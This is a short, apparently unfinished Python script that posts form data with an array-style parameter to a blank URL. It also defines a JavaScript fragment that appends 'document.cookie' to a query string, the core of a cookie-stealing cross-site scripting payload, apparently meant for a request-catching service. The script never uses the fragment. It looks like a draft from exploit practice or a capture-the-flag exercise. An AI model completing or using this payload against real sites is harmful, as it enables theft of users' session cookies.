import requests

url = ""
hookbin = "'?c='+document.cookie//" 
r = requests.post(url, data = {
  "content[]" : "value"
})

print(r.text)
